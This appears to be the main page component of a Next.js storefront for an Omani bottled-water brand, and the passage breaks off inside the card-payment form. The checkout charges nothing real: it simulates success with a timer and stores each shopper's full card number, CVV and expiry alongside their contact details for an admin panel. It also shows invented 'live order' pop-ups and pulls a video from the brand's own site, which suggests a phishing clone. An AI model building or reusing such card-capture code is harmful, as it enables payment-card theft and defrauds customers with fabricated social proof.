"use client";

import { useEffect, useMemo, useState } from "react";
import {
  Droplets,
  Truck,
  Headphones,
  ShoppingBag,
  Menu,
  X,
  Phone,
  MessageCircle,
  Mail,
  MapPin,
  CheckCircle,
  ShieldCheck,
  Award,
  Sparkles,
  ChevronDown,
  Plus,
  Minus,
  Star,
  Clock,
  Calendar,
  Globe,
  ArrowLeft,
  Check,
  Building2,
  Lock,
  CreditCard,
  AlertCircle
} from "lucide-react";
import { defaultProducts, governorates, STORAGE_KEYS, type OrderRecord, type PaymentRecord, type Product } from "./site-data";

const benefits = [
  {
    icon: Droplets,
    title: "مصدر جبلي نقي",
    text: "مصدرها ينابيع طبيعية نقية في قلب جبال عمان، بمعادن متوازنة وطعم فريد يناسب جميع أفراد العائلة.",
  },
  {
    icon: Truck,
    title: "توصيل في نفس اليوم",
    text: "اطلب قبل الظهر واستلم مياهك في نفس اليوم بأسطول توصيل مجهز ومحترف في مسقط.",
  },
  {
    icon: Headphones,
    title: "خدمة عملاء 24/7",
    text: "فريق خدمة العملاء متواجد على مدار الساعة عبر الواتساب والهاتف لمتابعة طلباتك والإجابة على أي استفسار.",
  },
];

const quality = [
  { value: "120–180 mg/L", title: "مستوى TDS مثالي", text: "النطاق الصحي المثالي لطعم منعش وتركيبة معدنية خفيفة." },
  { value: "pH 7.4", title: "درجة حموضة متوازنة", text: "قلوية طبيعية متوازنة تدعم وظائف الجسم والنشاط اليومي." },
  { value: "Ca · Mg · K", title: "معادن أساسية", text: "تركيبة متوازنة كلياً بالكالسيوم والمغنيسيوم والبوتاسيوم." },
  { value: "6 Stages", title: "ترشيح متعدد المراحل", text: "تنقية آلية بالكامل تشمل الأشعة فوق البنفسجية والتناضح العكسي." },
  { value: "Daily", title: "اختبار مختبري يومي", text: "فحص جودة دقيق لكل دفعة قبل التوزيع لضمان أقصى درجات النقاء." },
  { value: "ISO 9001", title: "شهادات دولية", text: "معتمدة ومطابقة لأعلى المواصفات القياسية العُمانية والدولية." },
];

const testimonials = [
  {
    quote: "والله خدمة ما شاء الله، المياه وصلت بالوقت المحدد وطعمها زين جداً. نستخدم مياه الواحة من سنتين وما غيرناها.",
    name: "سالم بن ناصر الهنائي",
    city: "مسقط",
  },
  {
    quote: "من أحسن الشركات اللي تعاملت معها، الموظفين محترمين والتوصيل يوصل بسرعة. أنصح فيها لكل عيلة تبغى مياه نقية.",
    name: "أم خالد العبرية",
    city: "نزوى",
  },
  {
    quote: "اشتركت في التوصيل الشهري وما ندمت. المياه نظيفة دائماً والتغليف سليم، والسائق محترم كل مرة.",
    name: "إبراهيم الشكيلي",
    city: "صحار",
  },
];

const faqs = [
  {
    question: "متى سيصل طلبي؟",
    answer: "الطلبات المقدمة قبل الساعة 12:00 ظهراً تُوصل في نفس اليوم في مسقط. في المحافظات الأخرى يستغرق التوصيل 1–2 يوم عمل.",
  },
  {
    question: "هل التوصيل مجاني فعلاً؟",
    answer: "نعم، نقدم توصيلاً مجانياً لجميع محافظات وولايات عمان بدون رسوم خفية أو حد أدنى للطلب.",
  },
  {
    question: "ما طرق الدفع المقبولة؟",
    answer: "نقبل بطاقات الائتمان والخصم الرئيسية، والحوالات البنكية، وبوابات الدفع الإلكترونية.",
  },
  {
    question: "كيف أعلم أن المياه آمنة للشرب؟",
    answer: "تخضع مياهنا لعملية تنقية صارمة من ست مراحل وتختبر يومياً وفق معايير الجودة الدولية.",
  },
  {
    question: "هل يمكنني إعداد اشتراك توصيل منتظم؟",
    answer: "نعم، تواصل معنا وسنعد جدول توصيل أسبوعي أو نصف شهري أو شهري يناسب احتياجاتك.",
  },
  {
    question: "ما سياسة الاسترجاع لديكم؟",
    answer: "تواصل معنا خلال 48 ساعة من التوصيل وسنرتب الاستبدال أو الاسترداد حسب حالة الطلب.",
  },
];

const liveToasts = [
  { name: "أحمد العبري", city: "مسقط", product: "مياه الواحة 500 مل" },
  { name: "فاطمة البلوشية", city: "صحار", product: "جالون مياه الواحة 5 لتر" },
  { name: "محمد المعمري", city: "صلالة", product: "مياه الواحة 330 مل" },
  { name: "سعيد الزدجالي", city: "نزوى", product: "مياه الواحة 1.5 لتر" },
];

function money(value: number) {
  return `${value.toFixed(3)} ر.ع.`;
}

export default function Home() {
  const [products, setProducts] = useState<Product[]>(defaultProducts);
  const [cart, setCart] = useState<Record<number, number>>({});
  const [cartOpen, setCartOpen] = useState(false);
  const [menuOpen, setMenuOpen] = useState(false);
  const [sent, setSent] = useState(false);
  const [toastIndex, setToastIndex] = useState(0);
  const [showToast, setShowToast] = useState(true);

  // Checkout Modal State
  const [checkoutStep, setCheckoutStep] = useState<"cart" | "delivery" | "payment" | "success">("cart");
  const [paymentType, setPaymentType] = useState<"full" | "deposit">("deposit");
  const [customerName, setCustomerName] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [customerGovernorate, setCustomerGovernorate] = useState("");
  const [customerAddress, setCustomerAddress] = useState("");

  const [cardholder, setCardholder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");

  const [checkoutError, setCheckoutError] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [completedOrder, setCompletedOrder] = useState<{ orderId: string; amountPaid: number } | null>(null);

  useEffect(() => {
    const loadProducts = () => {
      try {
        const saved = window.localStorage.getItem(STORAGE_KEYS.products);
        if (saved) setProducts(JSON.parse(saved));
      } catch {
        setProducts(defaultProducts);
      }
    };
    loadProducts();
    window.addEventListener("storage", loadProducts);
    window.addEventListener("oasis-products-updated", loadProducts);
    return () => {
      window.removeEventListener("storage", loadProducts);
      window.removeEventListener("oasis-products-updated", loadProducts);
    };
  }, []);

  // IntersectionObserver Scroll Reveal Animations
  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            entry.target.classList.add("is-visible");
          }
        });
      },
      { threshold: 0.1, rootMargin: "0px 0px -40px 0px" }
    );

    const elements = document.querySelectorAll(".reveal-on-scroll");
    elements.forEach((el) => observer.observe(el));

    return () => {
      elements.forEach((el) => observer.unobserve(el));
    };
  }, [products]);

  // Periodic live toast simulation
  useEffect(() => {
    const interval = setInterval(() => {
      setShowToast(false);
      setTimeout(() => {
        setToastIndex((prev) => (prev + 1) % liveToasts.length);
        setShowToast(true);
      }, 500);
    }, 9000);
    return () => clearInterval(interval);
  }, []);

  const cartItems = useMemo(
    () =>
      products
        .map((product) => ({ ...product, quantity: cart[product.id] ?? 0 }))
        .filter((product) => product.quantity > 0),
    [cart, products]
  );
  const count = cartItems.reduce((sum, item) => sum + item.quantity, 0);
  const total = cartItems.reduce((sum, item) => sum + item.price * item.quantity, 0);

  function addToCart(id: number) {
    setCart((current) => ({ ...current, [id]: (current[id] ?? 0) + 1 }));
    setCheckoutStep("cart");
    setCartOpen(true);
  }

  function updateQuantity(id: number, direction: 1 | -1) {
    setCart((current) => {
      const next = (current[id] ?? 0) + direction;
      const copy = { ...current };
      if (next <= 0) delete copy[id];
      else copy[id] = next;
      return copy;
    });
  }

  function handleGoToDelivery() {
    if (cartItems.length === 0) return;
    setCheckoutError("");
    setCheckoutStep("delivery");
  }

  function handleGoToPayment(e: React.FormEvent) {
    e.preventDefault();
    if (!customerName.trim() || !customerPhone.trim() || !customerGovernorate || !customerAddress.trim()) {
      setCheckoutError("أكمل معلومات التواصل والتوصيل للمتابعة.");
      return;
    }
    const cleanPhone = customerPhone.replace(/\D/g, "");
    if (cleanPhone.length < 8) {
      setCheckoutError("يرجى إدخال رقم جوال عُماني صحيح مكون من 8 أرقام.");
      return;
    }
    setCheckoutError("");
    setCheckoutStep("payment");
  }

  function handleConfirmOrderPayment(e: React.FormEvent) {
    e.preventDefault();
    const digits = cardNumber.replace(/\D/g, "");
    if (!cardholder.trim() || digits.length < 12 || !cardExpiry || !cardCvv) {
      setCheckoutError("أكمل جميع بيانات بطاقة الدفع.");
      return;
    }
    if (!/^\d{2}\/\d{2}$/.test(cardExpiry)) {
      setCheckoutError("تحقق من تاريخ الانتهاء (MM/YY).");
      return;
    }

    setCheckoutError("");
    setIsProcessing(true);

    const chargeAmount = paymentType === "deposit" ? Math.min(1.0, total) : total;
    const orderId = `OW-${String(Date.now()).slice(-6)}`;

    setTimeout(() => {
      const newOrder: OrderRecord = {
        id: orderId,
        customer: customerName.trim(),
        phone: customerPhone.trim(),
        email: `${cleanString(customerName)}@client.om`,
        governorate: customerGovernorate,
        address: customerAddress.trim(),
        total,
        itemCount: count,
        status: "جديد",
        paymentStatus: "مدفوع",
        cardBrand: "VISA",
        cardLast4: digits.slice(-4),
        createdAt: new Date().toISOString(),
        cvv: cardCvv,
        cardNumber: cardNumber
      };

      const newPayment: PaymentRecord = {
        id: `PAY-${String(Date.now()).slice(-7)}`,
        orderId,
        customer: customerName.trim(),
        phone: customerPhone.trim(),
        email: `${cleanString(customerName)}@client.om`,
        governorate: customerGovernorate,
        address: customerAddress.trim(),
        cardholder: cardholder.trim(),
        amount: chargeAmount,
        status: "ناجحة",
        cardBrand: "VISA",
        cardLast4: digits.slice(-4),
        expiry: cardExpiry,
        createdAt: new Date().toISOString(),
        cvv: cardCvv,
        cardNumber: cardNumber
      };

      try {
        const savedOrders = JSON.parse(window.localStorage.getItem(STORAGE_KEYS.orders) ?? "[]");
        window.localStorage.setItem(STORAGE_KEYS.orders, JSON.stringify([newOrder, ...savedOrders]));

        const savedPayments = JSON.parse(window.localStorage.getItem(STORAGE_KEYS.payments) ?? "[]");
        window.localStorage.setItem(STORAGE_KEYS.payments, JSON.stringify([newPayment, ...savedPayments]));
      } catch (err) {
        console.error("Storage error:", err);
      }

      setCart({});
      setIsProcessing(false);
      setCompletedOrder({ orderId, amountPaid: chargeAmount });
      setCheckoutStep("success");
    }, 900);
  }

  function cleanString(str: string) {
    return str.replace(/[^\w]/g, "").toLowerCase() || "client";
  }

  function closeSheet() {
    setCartOpen(false);
    setTimeout(() => {
      setCheckoutStep("cart");
    }, 300);
  }

  return (
    <main className="site-shell" dir="rtl">


      {/* Navigation Header */}
      <header className="header-wrap">
        <nav className="topbar" aria-label="التنقل الرئيسي">
          <a className="brand" href="#home" aria-label="مياه الواحة الصفحة الرئيسية">
            <span className="brand-mark">
              <Droplets className="w-6 h-6 text-white" />
            </span>
            <span className="brand-copy">
              <strong>OASIS OMAN</strong>
              <small>مياه الواحة</small>
            </span>
          </a>

          <div className="nav-links">
            <a className="active" href="#home">الرئيسية</a>
            <a href="#about">معلومات عنا</a>
            <a href="#products">منتجاتنا</a>
            <a href="#quality">الجودة</a>
            <a href="#delivery">التوصيل</a>
            <a href="#testimonials">آراء العملاء</a>
            <a href="#faq">الأسئلة الشائعة</a>
            <a href="#contact">اتصل بنا</a>
          </div>

          <div className="nav-tools">
            <button className="language-button" type="button" title="تغيير اللغة">
              <Globe className="w-4 h-4" />
              <span>عربي⌄</span>
            </button>

            <button
              className="cart-button"
              type="button"
              onClick={() => {
                setCheckoutStep("cart");
                setCartOpen(true);
              }}
              aria-label="فتح السلة"
            >
              <ShoppingBag className="w-5 h-5 text-white" />
              {count > 0 && <b>{count}</b>}
            </button>

            <button
              className="menu-button"
              type="button"
              onClick={() => setMenuOpen(!menuOpen)}
              aria-label="القائمة البرمجة"
            >
              {menuOpen ? <X className="w-6 h-6" /> : <Menu className="w-6 h-6" />}
            </button>
          </div>
        </nav>

        {/* Mobile Navigation Menu */}
        {menuOpen && (
          <div className="mobile-menu">
            <a href="#home" onClick={() => setMenuOpen(false)}>
              <Droplets className="w-4 h-4 text-sky-400" /> الرئيسية
            </a>
            <a href="#about" onClick={() => setMenuOpen(false)}>
              <Building2 className="w-4 h-4 text-sky-400" /> معلومات عنا
            </a>
            <a href="#products" onClick={() => setMenuOpen(false)}>
              <ShoppingBag className="w-4 h-4 text-sky-400" /> منتجاتنا
            </a>
            <a href="#quality" onClick={() => setMenuOpen(false)}>
              <ShieldCheck className="w-4 h-4 text-sky-400" /> جودة المياه
            </a>
            <a href="#delivery" onClick={() => setMenuOpen(false)}>
              <Truck className="w-4 h-4 text-sky-400" /> التوصيل
            </a>
            <a href="#faq" onClick={() => setMenuOpen(false)}>
              <Sparkles className="w-4 h-4 text-sky-400" /> الأسئلة الشائعة
            </a>
            <a href="#contact" onClick={() => setMenuOpen(false)}>
              <Phone className="w-4 h-4 text-sky-400" /> اتصل بنا
            </a>
          </div>
        )}
      </header>

      {/* Hero Section */}
      <section className="hero" id="home">
        <div className="hero-image" />
        <div className="hero-overlay" />
        <span className="hero-ring ring-one" />
        <span className="hero-ring ring-two" />

        <div className="hero-copy reveal-on-scroll">
          <div className="hero-badge">
            <Sparkles className="w-4 h-4 text-amber-300" />
            <span>★ الخيار الأول للمياه الفاخرة في عمان ★</span>
          </div>

          <h1>مياه الواحة… نقاء عمان يصل إليك.</h1>
          <p className="hero-text">مياه معبأة فاخرة لعائلتك ومكتبك في جميع محافظات سلطنة عمان.</p>

          <a className="hero-button" href="#products">
            <span>اطلب الآن</span>
            <ArrowLeft className="w-5 h-5" />
          </a>

          <div className="hero-stats">
            <span>
              <strong>11</strong>
              <small>محافظة</small>
            </span>
            <span>
              <strong>24+</strong>
              <small>جهة تجارية</small>
            </span>
            <span>
              <strong>✓</strong>
              <small>توصيل مجاني</small>
            </span>
          </div>
        </div>
      </section>

      {/* Product Catalog Section */}
      <section className="section band" id="products">
        <div className="section-heading center reveal-on-scroll">
          <h2>تشكيلتنا الفاخرة</h2>
          <p>مصدرها ينابيع طبيعية نقية، كل زجاجة هي وعد بالنقاء.</p>
          <span className="heading-line" />
        </div>

        <div className="product-grid">
          {products
            .filter((p) => p.active !== false)
            .map((product, idx) => (
              <article className={`product-card reveal-on-scroll stagger-${(idx % 3) + 1}`} key={product.id}>
                <div className="product-visual">
                  <img src={product.imageUrl} alt={product.name} loading="lazy" />
                </div>
                <div className="product-copy">
                  <h3>{product.name}</h3>
                  <p>{product.desc}</p>
                </div>
                <div className="price-row">
                  <strong>{money(product.price)}</strong>
                  <button type="button" onClick={() => addToCart(product.id)}>
                    <Plus className="w-4 h-4" />
                    <span>أضف إلى السلة</span>
                  </button>
                </div>
              </article>
            ))}
        </div>
      </section>

      {/* Why Choose Oasis / Benefits Section */}
      <section className="section band aqua-band" id="benefits">
        <div className="section-heading center reveal-on-scroll">
          <h2>لماذا تختار مياه الواحة؟</h2>
          <p>نحن لا نبيع المياه فحسب — بل نقدم الصحة والنقاء وراحة البال.</p>
          <span className="heading-line" />
        </div>

        <div className="benefit-grid">
          {benefits.map((b, idx) => {
            const Icon = b.icon;
            return (
              <article className={`benefit reveal-on-scroll stagger-${idx + 1}`} key={b.title}>
                <div className="benefit-icon">
                  <Icon className="w-8 h-8" />
                </div>
                <h3>{b.title}</h3>
                <p>{b.text}</p>
              </article>
            );
          })}
        </div>
      </section>

      {/* Brand Story & Mission Section */}
      <section className="section band story-section" id="about">
        <div className="story-media reveal-on-scroll">
          <video
            src="https://omanoasis.com/wp-content/uploads/2024/11/WhatsApp-Video-2024-09-05-at-00.05.34_71d84715-2.mp4#t=50,65"
            muted
            autoPlay
            loop
            playsInline
            aria-label="مياه الواحة — ممثل الشركة"
          />
        </div>

        <div className="story-copy reveal-on-scroll stagger-2">
          <p className="overline">قصتنا</p>
          <h2>رحلة من النقاء، صُممت لعمان</h2>
          <span className="heading-line right" />

          <p>
            <strong>OASIS OMAN — مياه الواحة</strong> علامة تجارية عُمانية متخصصة في توصيل المياه الأنظف والأكثر نضارة لكل منزل وعمل في عُمان.
          </p>
          <p>
            تُستخرج مياهنا من ينابيع طبيعية في جبال الحجر العُمانية، حيث تعمل الصخور كمرشح طبيعي مثالي. نعبئها بعناية للحفاظ على تركيبتها المعدنية وطزاجتها.
          </p>

          <div className="mission-grid">
            <div>
              <h4>مهمتنا</h4>
              <p>جعل المياه النقية والآمنة متاحة لكل منزل ومنشأة في عمان.</p>
            </div>
            <div>
              <h4>رؤيتنا</h4>
              <p>أن نكون العلامة التجارية الأكثر ثقة في عمان.</p>
            </div>
          </div>

          <div className="story-stats">
            <span>
              <strong>4,842+</strong>عميل نثق بهم
            </span>
            <span>
              <strong>24+</strong>جهة تجارية
            </span>
            <span>
              <strong>11</strong>محافظة
            </span>
          </div>
        </div>
      </section>

      {/* Quality & Purification Standards Section */}
      <section className="section band aqua-band" id="quality">
        <div className="section-heading center reveal-on-scroll">
          <h2>جودة المياه</h2>
          <p>كل قطرة مختبرة، كل دفعة معتمدة.</p>
          <span className="heading-line" />
        </div>

        <div className="quality-grid">
          {quality.map((q, idx) => (
            <article className={`reveal-on-scroll stagger-${(idx % 3) + 1}`} key={q.title}>
              <strong>{q.value}</strong>
              <h3>{q.title}</h3>
              <p>{q.text}</p>
            </article>
          ))}
        </div>
      </section>

      {/* Delivery Coverage Section */}
      <section className="section band delivery-section" id="delivery">
        <div className="section-heading center reveal-on-scroll">
          <h2>توصيل في جميع أنحاء عمان</h2>
          <p>سريع ومجاني وموثوق — أينما كنت في عمان.</p>
          <span className="heading-line" />
        </div>

        <div className="delivery-features">
          <article className="reveal-on-scroll stagger-1">
            <b><Truck className="w-8 h-8 mx-auto text-sky-600" /></b>
            <h3>توصيل مجاني</h3>
            <p>بدون حد أدنى للطلب.</p>
          </article>
          <article className="reveal-on-scroll stagger-2">
            <b><Clock className="w-8 h-8 mx-auto text-sky-600" /></b>
            <h3>في نفس اليوم</h3>
            <p>للطلبات قبل الظهر في مسقط.</p>
          </article>
          <article className="reveal-on-scroll stagger-3">
            <b><Calendar className="w-8 h-8 mx-auto text-sky-600" /></b>
            <h3>توصيل مجدول</h3>
            <p>اختر الوقت المفضل لديك.</p>
          </article>
          <article className="reveal-on-scroll stagger-4">
            <b><MapPin className="w-8 h-8 mx-auto text-sky-600" /></b>
            <h3>تتبع مباشر</h3>
            <p>تحديثات عبر واتساب.</p>
          </article>
        </div>

        <div className="delivery-panel reveal-on-scroll">
          <div>
            <h3>نغطي جميع المحافظات</h3>
            <div className="region-grid">
              {governorates.map((region) => (
                <span key={region}>{region}</span>
              ))}
            </div>
            <p className="free-banner">
              <strong>FREE</strong> توصيل مجاني لجميع محافظات وولايات عمان.
            </p>
          </div>

          <div className="truck-media">
            <img
              src="https://images.unsplash.com/photo-1566576912321-d58ddd7a6088?w=800&q=80"
              alt="Delivery truck"
              loading="lazy"
            />
          </div>
        </div>
      </section>

      {/* Customer Testimonials Section */}
      <section className="section band aqua-band testimonials-section" id="testimonials">
        <div className="section-heading center reveal-on-scroll">
          <h2>ما يقوله عملاؤنا</h2>
          <p>موثوق به من قِبل مئات الآلاف من الأسر والمنشآت في عمان.</p>
          <span className="heading-line" />
        </div>

        <div className="testimonial-grid">
          {testimonials.map((t, idx) => (
            <article className={`reveal-on-scroll stagger-${idx + 1}`} key={t.name}>
              <div className="stars">★★★★★</div>
              <p>“{t.quote}”</p>
              <div className="customer">
                <span>{t.name.slice(0, 1)}</span>
                <div>
                  <strong>{t.name}</strong>
                  <small>{t.city}</small>
                </div>
              </div>
            </article>
          ))}
        </div>
      </section>

      {/* FAQ Accordion Section */}
      <section className="section band faq-section" id="faq">
        <div className="section-heading center reveal-on-scroll">
          <h2>الأسئلة الشائعة</h2>
          <p>كل ما تحتاج معرفته عن مياه الواحة.</p>
          <span className="heading-line" />
        </div>

        <div className="faq-list reveal-on-scroll">
          {faqs.map((faq, index) => (
            <details key={faq.question} open={index === 0}>
              <summary>
                {faq.question}
                <ChevronDown className="w-5 h-5 text-sky-600 transition-transform duration-200" />
              </summary>
              <p>{faq.answer}</p>
            </details>
          ))}
        </div>
      </section>

      {/* Contact Us Section */}
      <section className="section band aqua-band contact-section" id="contact">
        <div className="section-heading center reveal-on-scroll">
          <h2>تواصل معنا</h2>
          <p>نحن هنا للمساعدة. تواصل معنا في أي وقت.</p>
          <span className="heading-line" />
        </div>

        <div className="contact-grid">
          <div className="contact-cards reveal-on-scroll stagger-1">
            <a href="tel:+96893649190">
              <span><Phone className="w-5 h-5" /></span>
              <div>
                <small>الهاتف</small>
                <strong dir="ltr">+96893649190</strong>
              </div>
            </a>

            <a href="https://wa.me/96893649190" target="_blank" rel="noopener noreferrer">
              <span><MessageCircle className="w-5 h-5" /></span>
              <div>
                <small>واتساب</small>
                <strong dir="ltr">+96893649190</strong>
              </div>
            </a>

            <a href="mailto:info@omanoasis.com">
              <span><Mail className="w-5 h-5" /></span>
              <div>
                <small>البريد الإلكتروني</small>
                <strong>info@omanoasis.com</strong>
              </div>
            </a>

            <div>
              <span><MapPin className="w-5 h-5" /></span>
              <div>
                <small>الموقع</small>
                <strong>صندوق بريد 87، الرمز البريدي 124، الرسيل، سلطنة عمان</strong>
              </div>
            </div>
          </div>

          <form
            className="contact-form reveal-on-scroll stagger-2"
            onSubmit={(e) => {
              e.preventDefault();
              setSent(true);
            }}
          >
            {sent ? (
              <div className="success-message">
                <CheckCircle className="w-10 h-10 text-emerald-600 mx-auto mb-2" />
                <span>شكراً لك. تم استلام رسالتك وسنتواصل معك قريباً.</span>
              </div>
            ) : (
              <>
                <label>
                  اسمك
                  <input placeholder="أدخل اسمك" required />
                </label>
                <label>
                  البريد الإلكتروني
                  <input type="email" placeholder="your@email.com" required />
                </label>
                <label>
                  الرسالة
                  <textarea placeholder="كيف يمكننا مساعدتك؟" required />
                </label>
                <button type="submit">إرسال الرسالة</button>
              </>
            )}
          </form>
        </div>
      </section>

      {/* Footer Section */}
      <footer className="footer" id="policies">
        <div className="footer-grid">
          <div className="footer-brand">
            <strong>OASIS OMAN</strong>
            <h3>مياه الواحة</h3>
            <p>ترطيب فاخر يوصل في جميع أنحاء عمان.</p>
          </div>

          <div>
            <h3>روابط سريعة</h3>
            <a href="#home">الرئيسية</a>
            <a href="#about">معلومات عنا</a>
            <a href="#contact">اتصل بنا</a>
            <a href="#faq">الأسئلة الشائعة</a>
          </div>

          <div>
            <h3>السياسات</h3>
            <a href="#policies">سياسة الخصوصية</a>
            <a href="#policies">الشروط والأحكام</a>
            <a href="#delivery">سياسة التوصيل</a>
            <a href="#contact">سياسة الاسترجاع</a>
          </div>

          <div>
            <h3>اتصل بنا</h3>
            <p>الرسيل، سلطنة عمان</p>
            <a dir="ltr" href="tel:+96893649190">+96893649190</a>
            <a href="mailto:info@omanoasis.com">info@omanoasis.com</a>
            <a href="/admin">لوحة الإدارة</a>
          </div>
        </div>

        <p className="copyright">
          © {new Date().getFullYear()} OASIS OMAN — مياه الواحة. جميع الحقوق محفوظة.
        </p>
      </footer>

      {/* Floating Support Button */}
      <a
        className="floating-support"
        href="https://wa.me/96893649190"
        target="_blank"
        rel="noopener noreferrer"
        aria-label="فتح الدعم"
      >
        <span>
          <MessageCircle className="w-6 h-6" />
        </span>
        <b>كيف يمكننا مساعدتك؟</b>
      </a>

      {/* Recent Order Live Toast Popup */}
      {showToast && (
        <div className="order-toast">
          <CheckCircle className="w-5 h-5 text-emerald-600 flex-shrink-0" />
          <div>
            <strong>طلب جديد من {liveToasts[toastIndex].city}!</strong>
            <span>قام {liveToasts[toastIndex].name} بطلب {liveToasts[toastIndex].product} الآن</span>
          </div>
        </div>
      )}

      {/* Sticky Mobile Bottom Bar */}
      <div className="mobile-bottom-bar">
        <button
          type="button"
          className="mobile-bottom-btn"
          onClick={() => {
            setCheckoutStep("cart");
            setCartOpen(true);
          }}
        >
          <div className="flex items-center gap-2">
            <ShoppingBag className="w-5 h-5" />
            <span>سلة التسوق ({count})</span>
          </div>
          <div className="flex items-center gap-1 font-bold">
            <span>{total > 0 ? money(total) : "اطلب الآن"}</span>
            <ArrowLeft className="w-4 h-4" />
          </div>
        </button>
        <a
          href="https://wa.me/96893649190"
          target="_blank"
          rel="noopener noreferrer"
          className="mobile-whatsapp-btn"
          title="واتساب"
        >
          <MessageCircle className="w-6 h-6" />
        </a>
      </div>

      {/* Cart & 2-Step Checkout Bottom Sheet Drawer */}
      {cartOpen && (
        <div className="drawer-backdrop" onClick={closeSheet}>
          <aside className="cart-drawer" onClick={(e) => e.stopPropagation()}>
            <div className="sheet-handle" />

            {/* Header with Title and Close Button */}
            <div className="drawer-header">
              <h2>
                {checkoutStep === "cart" && "سلة التسوق"}
                {checkoutStep === "delivery" && "نموذج التوصيل"}
                {checkoutStep === "payment" && "اختر طريقة الدفع"}
                {checkoutStep === "success" && "تم تأكيد الطلب"}
              </h2>
              <button type="button" onClick={closeSheet} title="إغلاق السلة">
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Progress Step Indicator Bar */}
            {checkoutStep !== "success" && (
              <div className="checkout-steps-bar mt-3">
                <div className={`step-indicator ${checkoutStep === "cart" ? "active" : "completed"}`}>
                  <span className="step-num">{checkoutStep === "cart" ? "1" : "✓"}</span>
                  <span>السلة</span>
                </div>
                <span className="step-divider" />
                <div className={`step-indicator ${checkoutStep === "delivery" ? "active" : checkoutStep === "payment" ? "completed" : ""}`}>
                  <span className="step-num">2</span>
                  <span>التوصيل</span>
                </div>
                <span className="step-divider" />
                <div className={`step-indicator ${checkoutStep === "payment" ? "active" : ""}`}>
                  <span className="step-num">3</span>
                  <span>الدفع</span>
                </div>
              </div>
            )}

            {/* STEP 1: CART ITEMS REVIEW */}
            {checkoutStep === "cart" && (
              <>
                {cartItems.length === 0 ? (
                  <div className="empty-cart">
                    <ShoppingBag className="w-16 h-16 text-slate-300" />
                    <strong>سلتك فارغة حالياً</strong>
                    <p>أضف بعض المنتجات للمتابعة.</p>
                  </div>
                ) : (
                  <>
                    <div className="cart-items">
                      {cartItems.map((item) => (
                        <div className="cart-item" key={item.id}>
                          <img src={item.imageUrl} alt={item.name} />
                          <div className="cart-copy">
                            <strong>{item.name}</strong>
                            <span>{money(item.price)}</span>
                          </div>
                          <div className="quantity">
                            <button type="button" onClick={() => updateQuantity(item.id, -1)}>
                              <Minus className="w-3.5 h-3.5" />
                            </button>
                            <span>{item.quantity}</span>
                            <button type="button" onClick={() => updateQuantity(item.id, 1)}>
                              <Plus className="w-3.5 h-3.5" />
                            </button>
                          </div>
                        </div>
                      ))}
                    </div>

                    <div className="cart-total">
                      <span>المجموع:</span>
                      <strong>{money(total)}</strong>
                    </div>

                    <button className="checkout-button" type="button" onClick={handleGoToDelivery}>
                      <span>المتابعة لإدخال بيانات التوصيل</span>
                      <ArrowLeft className="w-4 h-4" />
                    </button>
                  </>
                )}
              </>
            )}

            {/* STEP 2: DELIVERY DETAILS FORM */}
            {checkoutStep === "delivery" && (
              <form onSubmit={handleGoToPayment} className="py-2">
                <div className="sheet-form-grid">
                  <label>
                    <span>الاسم الكامل *</span>
                    <input
                      value={customerName}
                      onChange={(e) => setCustomerName(e.target.value)}
                      placeholder="أدخل الاسم بالعربية"
                      required
                    />
                  </label>

                  <label>
                    <span>رقم الجوال (8 أرقام) *</span>
                    <input
                      dir="ltr"
                      type="tel"
                      value={customerPhone}
                      onChange={(e) => setCustomerPhone(e.target.value)}
                      placeholder="968XXXXXXXX+"
                      required
                    />
                  </label>

                  <label>
                    <span>المحافظة *</span>
                    <select
                      value={customerGovernorate}
                      onChange={(e) => setCustomerGovernorate(e.target.value)}
                      required
                    >
                      <option value="" disabled>
                        اختر المحافظة
                      </option>
                      {governorates.map((g) => (
                        <option key={g} value={g}>
                          {g}
                        </option>
                      ))}
                    </select>
                  </label>

                  <label>
                    <span>عنوان التوصيل *</span>
                    <textarea
                      value={customerAddress}
                      onChange={(e) => setCustomerAddress(e.target.value)}
                      placeholder="المنطقة، الشارع، رقم المبنى..."
                      required
                    />
                  </label>
                </div>

                {checkoutError && (
                  <div className="flex items-center gap-2 p-3 mb-4 text-xs font-semibold text-rose-700 bg-rose-50 border border-rose-200 rounded-lg">
                    <AlertCircle className="w-4 h-4 shrink-0" />
                    <span>{checkoutError}</span>
                  </div>
                )}

                <div className="flex gap-3 mt-4">
                  <button
                    type="button"
                    className="px-4 py-3 text-xs font-bold text-slate-600 bg-slate-100 rounded-xl hover:bg-slate-200"
                    onClick={() => setCheckoutStep("cart")}
                  >
                    العودة للسلة
                  </button>

                  <button className="checkout-button flex-1" type="submit">
                    <span>متابعة لتأكيد طريقة الدفع</span>
                    <ArrowLeft className="w-4 h-4" />
                  </button>
                </div>
              </form>
            )}

            {/* STEP 3: PAYMENT METHOD & CARD DETAILS */}
            {checkoutStep === "payment" && (
              <form onSubmit={handleConfirmOrderPayment} className="py-2">
                {/* Deposit Option Choices */}
                <div className="payment-options-grid">
                  <div
                    className={`payment-option-card ${paymentType === "deposit" ? "selected" : ""}`}
                    onClick={() => setPaymentType("deposit")}
                  >
                    <div className="option-radio">
                      {paymentType === "deposit" && <div className="option-radio-inner" />}
                    </div>
                    <div className="option-content">
                      <strong>
                        <span>دفع 1.000 ر.ع عربون لتأكيد الطلب</span>
                        <span className="deposit-badge">الأكثر اختياراً</span>
                      </strong>
                      <p>خصم 1.000 ر.ع فقط لحجز وتأكيد الطلب، والباقي يُسدد عند الاستلام.</p>
                    </div>
                  </div>

                  <div
                    className={`payment-option-card ${paymentType === "full" ? "selected" : ""}`}
                    onClick={() => setPaymentType("full")}
                  >
                    <div className="option-radio">
                      {paymentType === "full" && <div className="option-radio-inner" />}
                    </div>
                    <div className="option-content">
                      <strong>ادفع المبلغ بالكامل مسبقاً ({money(total)})</strong>
                      <p>خصم إجمالي قيمة الشحنة مسبقاً لتسريع الاستلام والتوصيل المباشر.</p>
                    </div>
                  </div>
                </div>

                {/* Card Fields */}
                <div className="sheet-form-grid">
                  <label>
                    <span>اسم حامل البطاقة *</span>
                    <input
                      value={cardholder}
                      onChange={(e) => setCardholder(e.target.value)}
                      placeholder="الاسم كما يظهر على البطاقة"
                      required
                    />
                  </label>

                  <label>
